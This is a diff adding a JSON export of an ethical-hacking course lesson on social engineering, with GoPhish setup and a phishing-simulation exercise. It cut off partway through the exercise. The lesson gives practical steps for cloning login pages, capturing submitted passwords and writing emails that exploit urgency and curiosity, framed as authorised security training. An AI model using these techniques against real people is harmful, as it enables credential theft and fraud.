@@ -1,0 +1,1828 @@
+{
+  "data": {
+    "lesson": {
+      "id": 1089858,
+      "key": "774c0ab9-077c-4666-8634-06cdb01cdb8f",
+      "title": "Social Engineering",
+      "semantic_type": "Lesson",
+      "is_public": true,
+      "version": "1.0.0",
+      "locale": "en-us",
+      "summary": "Explore the tactics malicious hackers use to manipulate people to take specific actions, conduct a phishing simulation, create and deploy malware and design an effective landing page\n",
+      "lesson_type": null,
+      "display_workspace_project_only": false,
+      "resources": {
+        "files": [
+          {
+            "name": "Videos Zip File",
+            "uri": "https://zips.udacity-data.com/774c0ab9-077c-4666-8634-06cdb01cdb8f/1089858/1614205789970/Social+Engineering+Videos.zip"
+          },
+          {
+            "name": "Transcripts Zip File",
+            "uri": "https://zips.udacity-data.com/774c0ab9-077c-4666-8634-06cdb01cdb8f/1089858/1614205784838/Social+Engineering+Subtitles.zip"
+          }
+        ],
+        "google_plus_link": null,
+        "career_resource_center_link": null,
+        "coaching_appointments_link": null,
+        "office_hours_link": null,
+        "aws_provisioning_link": null
+      },
+      "project": null,
+      "lab": null,
+      "concepts": [
+        {
+          "id": 1089756,
+          "key": "d32f3806-9635-468f-a029-c841f0de84cf",
+          "title": "Introduction",
+          "semantic_type": "Concept",
+          "is_public": true,
+          "user_state": {
+            "node_key": "d32f3806-9635-468f-a029-c841f0de84cf",
+            "completed_at": null,
+            "last_viewed_at": null,
+            "unstructured": null
+          },
+          "resources": null,
+          "atoms": [
+            {
+              "id": 1089752,
+              "key": "56db9238-0c0d-4562-b22c-a7f2285fddae",
+              "title": "Introduction Heading",
+              "semantic_type": "TextAtom",
+              "is_public": true,
+              "text": "## Social Engineering",
+              "instructor_notes": ""
+            },
+            {
+              "id": 1089753,
+              "key": "f8413c4b-5852-4c58-992b-a2a12bb7e54c",
+              "title": "ND350 EHND C1 L4 A01 Introduction V2",
+              "semantic_type": "VideoAtom",
+              "is_public": true,
+              "instructor_notes": "",
+              "video": {
+                "youtube_id": "gMZ2i2VEDkI",
+                "china_cdn_id": "gMZ2i2VEDkI.mp4"
+              }
+            },
+            {
+              "id": 1089754,
+              "key": "311a7b79-d567-47ee-ae41-91a4f6be5792",
+              "title": "Introduction Summary",
+              "semantic_type": "TextAtom",
+              "is_public": true,
+              "text": "In this lesson, we will be looking at social engineering. Social engineering is about influencing people’s actions. \n\nThere are four key areas of focus:\n\n1. Five Opportunities In Human Psychology\n1. Phishing Simulations\n1. Creating Malware\n1. Landing Page For SE\n\nWe will finish this lesson with a small discussion on the ethics of social engineering.\n\nBy the end of the lesson, you will be able to:\n\n* Understand how hackers target emotions in social engineering attacks\n* Conduct enterprise-level phishing simulations\n* Create malware for various operating systems\n* Create highly persuasive web pages",
+              "instructor_notes": ""
+            }
+          ]
+        },
+        {
+          "id": 1089762,
+          "key": "3f1beb46-4b8b-4b24-8837-d5a53b9d69b6",
+          "title": "Why Social Engineering?",
+          "semantic_type": "Concept",
+          "is_public": true,
+          "user_state": {
+            "node_key": "3f1beb46-4b8b-4b24-8837-d5a53b9d69b6",
+            "completed_at": null,
+            "last_viewed_at": null,
+            "unstructured": null
+          },
+          "resources": null,
+          "atoms": [
+            {
+              "id": 1089757,
+              "key": "5c17ebbf-1fea-4716-8899-a8db185b8a55",
+              "title": "Why Social Engineering? Heading",
+              "semantic_type": "TextAtom",
+              "is_public": true,
+              "text": "## Why Does Social Engineering Matter?",
+              "instructor_notes": ""
+            },
+            {
+              "id": 1089758,
+              "key": "6facfce4-5060-4fc3-b364-0715b940d722",
+              "title": "ND350 EHND C1 L4 A02 Why Social Engineering Is Important",
+              "semantic_type": "VideoAtom",
+              "is_public": true,
+              "instructor_notes": "",
+              "video": {
+                "youtube_id": "mCVscssueWI",
+                "china_cdn_id": "mCVscssueWI.mp4"
+              }
+            },
+            {
+              "id": 1122377,
+              "key": "ddb93863-f3af-4a9d-b6ab-27a7e4801f89",
+              "title": null,
+              "semantic_type": "TextAtom",
+              "is_public": true,
+              "text": "### People Are The Weak Link!\n\nMost systems in the modern world rely on both technology and people.\n\nWhen everything is configured properly and is patched regularly, technology is very reliable. Machines and devices rarely make mistakes.\n\nOn the other hand, people can make mistakes all the time! Security breaches often occur when a bad actor takes advantage of human mistakes.",
+              "instructor_notes": ""
+            },
+            {
+              "id": 1122378,
+              "key": "9857dd06-c07a-40af-87da-ac9941366a9b",
+              "title": null,
+              "semantic_type": "ImageAtom",
+              "is_public": true,
+              "url": "https://video.udacity-data.com/topher/2020/December/5fe57ad9_3/3.png",
+              "non_google_url": "https://s3.cn-north-1.amazonaws.com.cn/u-img/9857dd06-c07a-40af-87da-ac9941366a9b",
+              "caption": "Most Systems Rely on Both Technology and People",
+              "alt": "Most Systems Rely on Both Technology and People",
+              "width": 500,
+              "height": 269,
+              "instructor_notes": null
+            },
+            {
+              "id": 1089760,
+              "key": "7d7f50d7-5554-41ee-9d9c-3d8d6684a7d3",
+              "title": "Why Social Engineering? Summary",
+              "semantic_type": "TextAtom",
+              "is_public": true,
+              "text": "## Social Engineering Can Help Ethical Hackers\n\nAn Ethical Hacker can use social engineering to:\n\n* **Access credentials required for exploits:  **Your system may have a vulnerability where the exploits require valid credentials, ranging from low-level standard user privileges or high-level admin privileges.\n* **Influence a user to take an action:  ** Some types of attacks will only work when a user interacts with the system by turning off a machine, clicking on a link, or opening a file.\n\nIn both of these situations, we can use social engineering to influence the user to give us the access we need.",
+              "instructor_notes": ""
+            },
+            {
+              "id": 1122383,
+              "key": "65119502-df0d-4414-b657-6051f4e53425",
+              "title": "",
+              "semantic_type": "RadioQuizAtom",
+              "is_public": true,
+              "instructor_notes": null,
+              "user_state": {
+                "node_key": "65119502-df0d-4414-b657-6051f4e53425",
+                "completed_at": null,
+                "last_viewed_at": null,
+                "unstructured": null
+              },
+              "question": {
+                "prompt": "A Social Engineering audit should only be done as part of an annual security audit",
+                "answers": [
+                  {
+                    "id": "8217ef3c-a553-440d-82d4-63d907c82291",
+                    "text": "True",
+                    "is_correct": false
+                  },
+                  {
+                    "id": "c3f57cb3-2b31-4cb6-bdb9-227e4b7ca65c",
+                    "text": "False ",
+                    "is_correct": true
+                  }
+                ]
+              }
+            },
+            {
+              "id": 1123111,
+              "key": "1344e7af-a47f-4fa2-bfdb-1847f938acef",
+              "title": null,
+              "semantic_type": "TextAtom",
+              "is_public": true,
+              "text": "### Further Reading\n\nIf you want to learn more about the importance of social engineering in an organization, Read this article from Triaxiom Security:  <a href=\"https://www.triaxiomsecurity.com/2018/04/19/why-is-a-social-engineering-engagement-so-important/\" target=\"_blank\">Why Is A Social Engineering Engagement So Important?</a>. It discusses the important role of social engineering and covers some common excuses organization's use for not having a well-defined social engineering program.",
+              "instructor_notes": ""
+            }
+          ]
+        },
+        {
+          "id": 1089769,
+          "key": "d18a1c2a-b57e-43f8-9370-3355067d1f41",
+          "title": "How Experts Approach Social Engineering",
+          "semantic_type": "Concept",
+          "is_public": true,
+          "user_state": {
+            "node_key": "d18a1c2a-b57e-43f8-9370-3355067d1f41",
+            "completed_at": null,
+            "last_viewed_at": null,
+            "unstructured": null
+          },
+          "resources": null,
+          "atoms": [
+            {
+              "id": 1089763,
+              "key": "191d25eb-1c5d-4ce3-8bca-c35949da9fcb",
+              "title": "How Experts Approach Social Engineering Heading",
+              "semantic_type": "TextAtom",
+              "is_public": true,
+              "text": "## Secrets Of Social Engineering",
+              "instructor_notes": ""
+            },
+            {
+              "id": 1089764,
+              "key": "256685a4-4945-475c-afab-5469f310a834",
+              "title": "ND350 EHND C1 L4 A03 How Experts Approach Social Engineering V3",
+              "semantic_type": "VideoAtom",
+              "is_public": true,
+              "instructor_notes": "",
+              "video": {
+                "youtube_id": "oFab7TtB4Qs",
+                "china_cdn_id": "oFab7TtB4Qs.mp4"
+              }
+            },
+            {
+              "id": 1089765,
+              "key": "e787e2c1-7f9f-4d81-b4ad-a86cb51192d1",
+              "title": "How Experts Approach Social Engineering Summary",
+              "semantic_type": "TextAtom",
+              "is_public": true,
+              "text": "## Social Engineering is About Understanding Psychology and Human Emotions \n\nSocial Engineering is not about terms like phishing, vishing, dumpster diving, tailgating, etc. \n\nThere are **Five Opportunities In Human Psychology**:",
+              "instructor_notes": ""
+            },
+            {
+              "id": 1121904,
+              "key": "effbb38a-a534-4a5f-9a92-693990fdf536",
+              "title": null,
+              "semantic_type": "ImageAtom",
+              "is_public": true,
+              "url": "https://video.udacity-data.com/topher/2020/December/5fe3708d_2/2.png",
+              "non_google_url": "https://s3.cn-north-1.amazonaws.com.cn/u-img/effbb38a-a534-4a5f-9a92-693990fdf536",
+              "caption": "Five Opportunities In Human Psychology",
+              "alt": "Greed, Fear, Urgency, Curiosity  and Helpfulness are opportunities to take advantage of",
+              "width": 800,
+              "height": 449,
+              "instructor_notes": null
+            },
+            {
+              "id": 1121906,
+              "key": "8066bb41-70d8-4e05-87ae-52b41a36b141",
+              "title": null,
+              "semantic_type": "TextAtom",
+              "is_public": true,
+              "text": "* **Greed** influences emotions as well as logic.  People want to possess things that they don’t need. \n* **Fear** can occur when people worry about the future or when people start focusing on regrets. \n* **Urgency** makes people panic and take action.\n* **Curiosity** is the continual desire to discover and investigate new things.\n* **Helpfulness i**s an opportunity that enables teamwork and supporting one another for a greater good or larger purpose.\n\nThese are the five fundamental opportunities that a good social engineer needs to understand and take advantage of.",
+              "instructor_notes": ""
+            },
+            {
+              "id": 1121908,
+              "key": "20955003-75d8-453c-a6bf-3fbdd484e3e6",
+              "title": null,
+              "semantic_type": "RadioQuizAtom",
+              "is_public": true,
+              "instructor_notes": null,
+              "user_state": {
+                "node_key": "20955003-75d8-453c-a6bf-3fbdd484e3e6",
+                "completed_at": null,
+                "last_viewed_at": null,
+                "unstructured": null
+              },
+              "question": {
+                "prompt": "An employee receives an email that appears to be from his manager which talks about an upcoming meeting the next day. The message is written in a very strong and angry tone and is asking for the presentation files.  Which opportunity is being exploited?\n",
+                "answers": [
+                  {
+                    "id": "e446b3bd-5cf3-4036-bd22-b0cbdd1b9301",
+                    "text": "Authority",
+                    "is_correct": false
+                  },
+                  {
+                    "id": "962c8aec-c2f2-4e25-be7e-a30ffb35bde8",
+                    "text": "Urgency",
+                    "is_correct": true
+                  },
+                  {
+                    "id": "d7776794-b240-4371-b505-895709d4a000",
+                    "text": "Familiarity",
+                    "is_correct": false
+                  }
+                ]
+              }
+            },
+            {
+              "id": 1123922,
+              "key": "94efc73f-eb7a-4d88-8d27-e36ca25c4796",
+              "title": null,
+              "semantic_type": "TextAtom",
+              "is_public": true,
+              "text": "### New Terms\n\n| Term | Definition |\n|-|-|\n| Dumpster Diving | A social engineering technique where the attacker looks for potentially valuable information in the organization's trash cans or dumpsters | \n| Phishing | A social engineering attack where the attacker sends an email to the target to influence their actions to gain access or sensitive information | \n| Tailgaiting | A social engineering technique where the attacker closely follows a target to gain access to a restricted area. For example, when the target uses a key card to open a door, the attacker enters the room before the door closes. | \n| Vishing | A social engineering attack where the attacker calls the target to influence their actions to gain access or sensitive information | \n",
+              "instructor_notes": ""
+            },
+            {
+              "id": 1123112,
+              "key": "a3b57494-d119-414c-bdb6-6bd22bd89f87",
+              "title": null,
+              "semantic_type": "TextAtom",
+              "is_public": true,
+              "text": "### Further Reading\n\nThe article from SecureWorld shares more examples of how emotions can be used in social engineering: <a href=\"https://www.secureworldexpo.com/industry-news/5-emotions-hackers-use-social-engineering-attacks\" target=\"_blank\">5 Emotions Used in Social Engineering Attacks</a>.",
+              "instructor_notes": null
+            }
+          ]
+        },
+        {
+          "id": 1089778,
+          "key": "99ed8229-754b-494b-a9d5-c256b7689819",
+          "title": "Phishing Simulation",
+          "semantic_type": "Concept",
+          "is_public": true,
+          "user_state": {
+            "node_key": "99ed8229-754b-494b-a9d5-c256b7689819",
+            "completed_at": null,
+            "last_viewed_at": null,
+            "unstructured": null
+          },
+          "resources": null,
+          "atoms": [
+            {
+              "id": 1089770,
+              "key": "3bd1209f-304f-4af7-8131-fdfcd4bdf787",
+              "title": "Phishing Simulation Heading",
+              "semantic_type": "TextAtom",
+              "is_public": true,
+              "text": "## Managing a Phishing Simulation",
+              "instructor_notes": ""
+            },
+            {
+              "id": 1089771,
+              "key": "3d687303-e39c-45b9-9dee-6af51cef383e",
+              "title": "ND350 EHND C1 L4 A04 Phishing Simulation",
+              "semantic_type": "VideoAtom",
+              "is_public": true,
+              "instructor_notes": "",
+              "video": {
+                "youtube_id": "6JEJrfODMUk",
+                "china_cdn_id": "6JEJrfODMUk.mp4"
+              }
+            },
+            {
+              "id": 1122423,
+              "key": "c33db04c-905d-42d4-a1cf-686802cf197f",
+              "title": null,
+              "semantic_type": "TextAtom",
+              "is_public": true,
+              "text": "### What is Phishing? \n\nPhishing is a social engineering attack where an attacker sends an email to the victim to entice them to take some action (e.g. clicking on a link to open a URL or downloading a file and running it) which opens a vulnerability for the attacker.\n\nSince the attack focuses on people and not on technology, it is not possible to defend it using technology.\n\nInstead, we need to use simulation exercises to identify the employees who are most vulnerable to this type of attack. That allows us to provide training for those employees to help them recognize and avoid phishing attacks.",
+              "instructor_notes": null
+            },
+            {
+              "id": 1122422,
+              "key": "bee4fb4c-88ad-4ceb-810d-620d24f822fe",
+              "title": null,
+              "semantic_type": "ImageAtom",
+              "is_public": true,
+              "url": "https://video.udacity-data.com/topher/2021/January/60005f96_5/5.png",
+              "non_google_url": "https://s3.cn-north-1.amazonaws.com.cn/u-img/bee4fb4c-88ad-4ceb-810d-620d24f822fe",
+              "caption": "What Is Phishing? ",
+              "alt": "In phishing, an attacker sends an email and entices the victim to perform a task that opens a vulnerability",
+              "width": 800,
+              "height": 433,
+              "instructor_notes": null
+            },
+            {
+              "id": 1122424,
+              "key": "7b4c63b3-bdaa-4c65-bcb6-68a176c683b4",
+              "title": null,
+              "semantic_type": "TextAtom",
+              "is_public": true,
+              "text": "## Managing a Phishing Simulation\n\nA phishing simulation generally has five steps:",
+              "instructor_notes": null
+            },
+            {
+              "id": 1122425,
+              "key": "b3755f9a-22ec-4321-b634-cfa3d0d66ab3",
+              "title": null,
+              "semantic_type": "ImageAtom",
+              "is_public": true,
+              "url": "https://video.udacity-data.com/topher/2020/December/5fe640a3_6/6.png",
+              "non_google_url": "https://s3.cn-north-1.amazonaws.com.cn/u-img/b3755f9a-22ec-4321-b634-cfa3d0d66ab3",
+              "caption": "Managing a Phishing Simulation Steps",
+              "alt": "Process for managing a phishing simulation",
+              "width": 1026,
+              "height": 159,
+              "instructor_notes": null
+            },
+            {
+              "id": 1121332,
+              "key": "383fc80a-aa51-4c3d-834b-1f02565473cc",
+              "title": null,
+              "semantic_type": "TextAtom",
+              "is_public": true,
+              "text": "1. **Configure the sending profile**\nThis is where we configure the email address we want to send the phishing emails from.\n1. **Import users**\nYou may want to divide the users into groups based on their job positions or departments.  That allows you to send different campaigns to different groups or at different times. This can be especially helpful if you are working with a large organization.\n1. **Build a landing page**\nA landing page is a website where the phishing email recipients will land if they click the link in your email. It is very easy to clone existing websites.  Popular social media login pages are often cloned for phishing attacks.\n1. **Create an email**\nCreating a realistic email is the most important part of the process and requires extensive research and analysis of the users. The users will not open the email if its subject line does not interest them and they'll stop reading after the few lines if the email is poorly written. They will not click on the link unless there is a compelling reason to do so.\n1. **Organize into a Campaign**\nIt’s like creating a small project. You set the time when users will get the email and you use a dashboard to see how many employees opened the email, how many clicked on the link, and who submitted data.",
+              "instructor_notes": null
+            },
+            {
+              "id": 1127834,
+              "key": "8f418cb8-373b-47f4-96b8-7d498380a76d",
+              "title": null,
+              "semantic_type": "TextAtom",
+              "is_public": true,
+              "text": "### New Terms\n\n<div class=\"index-module--table-responsive--1zG6k\"><table class=\"index-module--table--8j68C index-module--table-striped--3HHC-\">\n<thead>\n<tr>\n<th>Term</th>\n<th>Definition</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>Landing Page</td>\n<td>The web page where the target lands after clicking a link in a phishing simulation</td>\n</tr>\n<tr>\n<td>Phishing Campaign</td>\n<td>An organized security test using email to trick a user into revealing sensitive information.</td>\n</tr>\n<tr>\n<td>Phishing Simulation</td>\n<td>A defensive exercise where the security analyst simulates a phishing attack in a controlled environment</td>\n</tr>\n<tr>\n<td>Sending Profile</td>\n<td>A set of configurations that defines the identity of the email-sender in a phishing simulation, including name, email address, designation, and signature</td>\n</tr>\n<tr>\n<td>Simple Mail Transfer Protocol (SMTP)</td>\n<td>A protocol used to send and receive email messages. Common authentication method includes using a username and password combination</td>\n</tr>\n</tbody>\n</table>\n</div>",
+              "instructor_notes": null
+            },
+            {
+              "id": 1123113,
+              "key": "bcc8aabd-c32a-4a96-8651-10b91b73bf36",
+              "title": null,
+              "semantic_type": "TextAtom",
+              "is_public": true,
+              "text": "### Further Reading\n\nApart from phishing, There are many other types of social engineering attacks. Learn more about some of them here:  <a href=\"https://www.itgovernance.co.uk/social-engineering-attacks\" target=\"_blank\">IT Governance: What is social engineering?</a>",
+              "instructor_notes": null
+            }
+          ]
+        },
+        {
+          "id": 1127866,
+          "key": "ccd1bf20-46d7-49a9-b456-e3b5e7951d3a",
+          "title": "Using GoPhish",
+          "semantic_type": "Concept",
+          "is_public": true,
+          "user_state": {
+            "node_key": "ccd1bf20-46d7-49a9-b456-e3b5e7951d3a",
+            "completed_at": null,
+            "last_viewed_at": null,
+            "unstructured": null
+          },
+          "resources": null,
+          "atoms": [
+            {
+              "id": 1127867,
+              "key": "16e4640e-3e98-4395-a853-fa6569581701",
+              "title": "Phishing Simulation Video 1 Notes",
+              "semantic_type": "TextAtom",
+              "is_public": true,
+              "text": "## Setting Up GoPhish",
+              "instructor_notes": ""
+            },
+            {
+              "id": 1127868,
+              "key": "bb5ec0f3-862d-4083-a7a4-a2c29cb526e3",
+              "title": "ND350 EHND C1 L4 A05 Setting Up GoPhish",
+              "semantic_type": "VideoAtom",
+              "is_public": true,
+              "instructor_notes": "",
+              "video": {
+                "youtube_id": "bYhMsEvA_TA",
+                "china_cdn_id": "bYhMsEvA_TA.mp4"
+              }
+            },
+            {
+              "id": 1127869,
+              "key": "a48d5104-a40c-4801-b552-86e27311b7fa",
+              "title": null,
+              "semantic_type": "TextAtom",
+              "is_public": true,
+              "text": "### Instructions For Setting Up GoPhish on the Analyst Machine\n\n1. Download the latest version of GoPhish for Linux at:  <a href=\"https://getgophish.com\" target=\"_blank\">https://getgophish.com</a>\n1. Extract all the files to a folder and open a terminal in that folder\n1. Add executable permissions to GoPhish file:\n```bash\nchmod +x gophish\n```\n\n1. Start the GoPhish server:\n```bash\n./gophish\n```\n\n1. Find the credentials for the login page in the terminal window. Look for the username **admin** followed by a long random password. \n1. Open a browser and visit <a href=\"https://127.0.0.1:3333\" target=\"_blank\">https://127.0.0.1:3333</a>\n1. Ignore the SSL warning and sign in using the **admin** credentials to reach the password reset screen.",
+              "instructor_notes": ""
+            },
+            {
+              "id": 1127870,
+              "key": "a2da12db-9afb-4272-a9f6-ad044a2c0104",
+              "title": null,
+              "semantic_type": "TextAtom",
+              "is_public": true,
+              "text": "## Setting Up A Phishing Campaign: Part 1",
+              "instructor_notes": null
+            },
+            {
+              "id": 1127871,
+              "key": "f6ec6a9c-6202-43e5-ab22-b7c45627872f",
+              "title": "ND350 EHND C1 L4 A06a Managing Phishing Campaign Phase 1 3 V3",
+              "semantic_type": "VideoAtom",
+              "is_public": true,
+              "instructor_notes": null,
+              "video": {
+                "youtube_id": "iCcf7dsOT2E",
+                "china_cdn_id": "iCcf7dsOT2E.mp4"
+              }
+            },
+            {
+              "id": 1127872,
+              "key": "ada203d8-cf82-4b1b-8c5c-e7d734254a4a",
+              "title": "Phishing Simulation Video 2 Notes",
+              "semantic_type": "TextAtom",
+              "is_public": true,
+              "text": "### Phase 1 - Configure The Sending Profile\n\n1. Login to Gophish using the provided credentials\n1. Navigate to the **Sending Profile** page and click on the **New Profile **button.\n1. Fill in all fields: \n   * **Name**: any name you choose\n   * **From**: the name and address the user will see using the format`Name <Email>`\n   * **Host**: your email provider's SMTP Host using the format `SMTP Server Address:Port`\n   * **Username**: the email address you want to use to send the emails from \n   * **Password**: the password for the email address you provided\n1. Send a test email to yourself using the **Send Test Email **button to confirm that it works. \n\n### Phase 2 - Create Users and Groups\n\n1. Navigate to the **Users & Groups** tab and click on **New Group**.\n1. Fill in the **Name** field. You can give any name you wish in the Name field. For Example: `All Users`.\n1. Click on the **Bull Import Users** button to import users from a CSV file or add them manually. \n1. Add users manually by entering the data in the required fields for each user:\n   * First Name\n   * Last Name\n   * Email address\n   * Position\n1. Click **Save changes** after all users have been added.\n\n### Phase 3 - Configure The Landing Page\n\n1. Navigate to the **Landing Pages** page and click on the **New Page** button.\n1. Give the page a Name\n1. Enter the HTML code for the landing page or click on the **Import Site** button to enter the URL of an existing webpage. \n1. Check the **Capture Submitted Data** and the **Capture Passwords** boxes.\n1. Enter a webpage URL for the webpage you want to send the victim after capturing their data in the **Redirect to** box. \n1. Click on the **Save Page** button.",
+              "instructor_notes": ""
+            },
+            {
+              "id": 1127873,
+              "key": "c81810ea-8c38-4449-a9bb-f6804afe4ffb",
+              "title": null,
+              "semantic_type": "TextAtom",
+              "is_public": true,
+              "text": "## Setting Up A Phishing Campaign: Part 2",
+              "instructor_notes": null
+            },
+            {
+              "id": 1127874,
+              "key": "ed23e7b2-869b-4219-8aed-68c4b06a75f3",
+              "title": "ND350 EHND C1 L4 A06b Managing Phishing Campaign Phase 4 5",
+              "semantic_type": "VideoAtom",
+              "is_public": true,
+              "instructor_notes": null,
+              "video": {
+                "youtube_id": "34pwIcakcx4",
+                "china_cdn_id": "34pwIcakcx4.mp4"
+              }
+            },
+            {
+              "id": 1127875,
+              "key": "d86ee563-dd0a-4292-b5ca-eeede22e5e58",
+              "title": "Phishing Simulation Video 2 Notes",
+              "semantic_type": "TextAtom",
+              "is_public": true,
+              "text": "### Phase 4 - Configure The Email Template\n\n1. Navigate to the **Email Templates** page and click on the **New Template** button.\n1. Give the template a **Name.**\n1. Import the email by clicking on the** Import Email** button or enter the email subject and text manually using `{{URL}}` as the placeholder for the URL you want to include in the email.\n1. Click on **Save template**.\n\n### Phase 5 - Set Up A Campaign\n\n1. Navigate to the **Campaigns** page, click on the **New Campaign** button.\n1. Give the Campaign a **Name** field. \n1. From  dropdowns select the elements you just created:\n   * **Email template**\n   * **Landing Page** \n   * **Sending Profile**\n1. In the **URL** box enter your IP address. \n1. Enter a **Launch Date** for the campaign.\n1. Select the target group for the campaign in the **Groups** dropdown.\n1. Click on the **Launch Campaign** button.",
+              "instructor_notes": ""
+            },
+            {
+              "id": 1127880,
+              "key": "368a033e-4af4-4145-b4a9-9237299fcc08",
+              "title": null,
+              "semantic_type": "TextAtom",
+              "is_public": true,
+              "text": "### Campaign Results",
+              "instructor_notes": null
+            },
+            {
+              "id": 1127881,
+              "key": "49d0aca4-39ed-4062-90e7-cbb5d1a8c393",
+              "title": "ND350 EHND C1 L4 A06c Managing Phishing Campaign Campaign Results",
+              "semantic_type": "VideoAtom",
+              "is_public": true,
+              "instructor_notes": null,
+              "video": {
+                "youtube_id": "DAOwTJ0uCFY",
+                "china_cdn_id": "DAOwTJ0uCFY.mp4"
+              }
+            },
+            {
+              "id": 1127882,
+              "key": "4acb9c09-92e3-4ab6-93a9-3a6247b98125",
+              "title": null,
+              "semantic_type": "TextAtom",
+              "is_public": true,
+              "text": "### Viewing Results\n\nAfter the campaign has launched, you can see the results on the **Dashboard** page.  It shows you\n\n* How many emails were sent\n* How many emails were opened\n* How many victims clicked on the link\n* How many victims submitted data\n* How many victims reported the email (requires setting up a webhook)\n\nIn the **Details** section you can find more information about the tracked events. You can also export  information as a CSV file.",
+              "instructor_notes": null
+            }
+          ]
+        },
+        {
+          "id": 1089782,
+          "key": "7cacf3dc-facf-426a-aec8-d7fbfd31c098",
+          "title": "Quizzes: Phishing Simulation ",
+          "semantic_type": "Concept",
+          "is_public": true,
+          "user_state": {
+            "node_key": "7cacf3dc-facf-426a-aec8-d7fbfd31c098",
+            "completed_at": null,
+            "last_viewed_at": null,
+            "unstructured": null
+          },
+          "resources": null,
+          "atoms": [
+            {
+              "id": 1089779,
+              "key": "f14d14de-4755-46e2-8d88-57f93b4ea7a6",
+              "title": "Phishing Simulation Quizzes Heading",
+              "semantic_type": "TextAtom",
+              "is_public": true,
+              "text": "##  Thinking About Phishing Simulation",
+              "instructor_notes": ""
+            },
+            {
+              "id": 1089780,
+              "key": "18887556-c7bc-44ac-87ee-2c639dd98ea4",
+              "title": "Phishing Simulation Easy Quiz",
+              "semantic_type": "MatchingQuizAtom",
+              "is_public": true,
+              "instructor_notes": null,
+              "user_state": {
+                "node_key": "18887556-c7bc-44ac-87ee-2c639dd98ea4",
+                "completed_at": null,
+                "last_viewed_at": null,
+                "unstructured": null
+              },
+              "question": {
+                "complex_prompt": {
+                  "text": "Organize these steps into a successful Phishing campaign"
+                },
+                "concepts_label": "Steps",
+                "answers_label": "Tasks",
+                "concepts": [
+                  {
+                    "text": "Step 1",
+                    "correct_answer": {
+                      "id": "a1603806135746",
+                      "text": "Create a sending profile"
+                    }
+                  },
+                  {
+                    "text": "Step 2",
+                    "correct_answer": {
+                      "id": "a1603806249379",
+                      "text": "Draft an email template"
+                    }
+                  },
+                  {
+                    "text": "Step 3",
+                    "correct_answer": {
+                      "id": "a1603806252426",
+                      "text": "Launch the campaign"
+                    }
+                  },
+                  {
+                    "text": "Step 4",
+                    "correct_answer": {
+                      "id": "a1603806255677",
+                      "text": "Analyze the results"
+                    }
+                  }
+                ],
+                "answers": [
+                  {
+                    "id": "339bb843-cc85-451e-9b79-f78eee948004",
+                    "text": "Collect emails for phishing"
+                  },
+                  {
+                    "id": "a1603806135746",
+                    "text": "Create a sending profile"
+                  },
+                  {
+                    "id": "a1603806249379",
+                    "text": "Draft an email template"
+                  },
+                  {
+                    "id": "a1603806252426",
+                    "text": "Launch the campaign"
+                  },
+                  {
+                    "id": "c0880710-a18e-4ac6-881c-5fbd5651455a",
+                    "text": "Implement security controls based on results"
+                  },
+                  {
+                    "id": "a1603806255677",
+                    "text": "Analyze the results"
+                  }
+                ]
+              }
+            },
+            {
+              "id": 1089781,
+              "key": "8d83b6ab-fbe7-4a0e-924b-178710721089",
+              "title": "Phishing Simulation Hard Quiz",
+              "semantic_type": "CheckboxQuizAtom",
+              "is_public": true,
+              "instructor_notes": null,
+              "user_state": {
+                "node_key": "8d83b6ab-fbe7-4a0e-924b-178710721089",
+                "completed_at": null,
+                "last_viewed_at": null,
+                "unstructured": null
+              },
+              "question": {
+                "prompt": "Which of these may cause compliance issues for a phishing simulation? *Hint: if you are not familiar with any of these terms you can look them up on the internet*",
+                "answers": [
+                  {
+                    "id": "rbk1",
+                    "text": "HIPPA",
+                    "is_correct": true
+                  },
+                  {
+                    "id": "rbk2",
+                    "text": "SOX",
+                    "is_correct": false
+                  },
+                  {
+                    "id": "a1603807014041",
+                    "text": "GDPR",
+                    "is_correct": true
+                  },
+                  {
+                    "id": "a1603807021027",
+                    "text": "PATRIOT Act",
+                    "is_correct": false
+                  }
+                ]
+              }
+            }
+          ]
+        },
+        {
+          "id": 1089786,
+          "key": "24765875-44a7-4ade-9abe-f0a14549562d",
+          "title": "Exercise: Phishing Simulation",
+          "semantic_type": "Concept",
+          "is_public": true,
+          "user_state": {
+            "node_key": "24765875-44a7-4ade-9abe-f0a14549562d",
+            "completed_at": null,
+            "last_viewed_at": null,
+            "unstructured": null
+          },
+          "resources": {
+            "files": [
+              {
+                "name": "employees.csv",
+                "uri": "https://video.udacity-data.com/topher/2021/January/60086801_employees/employees.csv"
+              }
+            ],
+            "google_plus_link": null,
+            "career_resource_center_link": null,
+            "coaching_appointments_link": null,
+            "office_hours_link": null,
+            "aws_provisioning_link": null
+          },
+          "atoms": [
+            {
+              "id": 1089783,
+              "key": "94585714-e68d-4b2f-8126-766a744886ad",
+              "title": "Exercise: Phishing Simulation Heading",
+              "semantic_type": "TextAtom",
+              "is_public": true,
+              "text": "## Phishing Simulation with GoPhish",
+              "instructor_notes": ""
+            },
+            {
+              "id": 1089784,
+              "key": "e297b77a-c2b0-48a4-8a57-e31c8df5e2ec",
+              "title": "Exercise: Phishing Simulation Instructions",
+              "semantic_type": "TextAtom",
+              "is_public": true,
+              "text": "Your organization wants to conduct a phishing simulation exercise. Your task is to set up a campaign in GoPhish with the configurations listed below.",
+              "instructor_notes": ""
+            },
+            {
+              "id": 1131025,
+              "key": "152faf73-0b3b-48f7-bee4-b6bfe5969f38",
+              "title": null,
+              "semantic_type": "TextAtom",
+              "is_public": true,
+              "text": "### Sending Profile\n\n* Sender:  Austin Clarke  /  `austin @example.com`\n* SMTP port:  `25`\n* Sending profile credentials: `phish @example.com` / `pass@123`\n\n### Users and Groups\n* Import users from  <a href=\"https://video.udacity-data.com/topher/2021/January/60086801_employees/employees.csv\" target=\"_blank\">employees.csv</a> \n\n### Landing Page\n\n* Clone your favorite website's login page\n* Capture the passwords and redirect the user to the original login page after successful completion\n\n### Email Template\n\n* Write a subject line that takes advantage of the target's **curiosity**\n* Include a message that uses **urgency** in the body \n\n### Set Up the Campaign\n\n* Create a campaign with the name** ExampleCorp Q3 Phishing**\n* Set the campaign to send emails next Friday at 5 PM",
+              "instructor_notes": ""
+            },
+            {
+              "id": 1089785,
+              "key": "341d422c-5efb-41c9-ab9f-d7c1c13bca8b",
+              "title": "Exercise: Phishing Simulation",
+              "semantic_type": "TaskListAtom",
+              "is_public": true,
+              "instructor_notes": null,
+              "user_state": {
+                "node_key": "341d422c-5efb-41c9-ab9f-d7c1c13bca8b",
+                "completed_at": null,
+                "last_viewed_at": null,
+                "unstructured": null
+              },
+              "tasks": [
+                "Configure **Sending profile** based on policy details",
+                "Configure **Landing page** based on policy details",
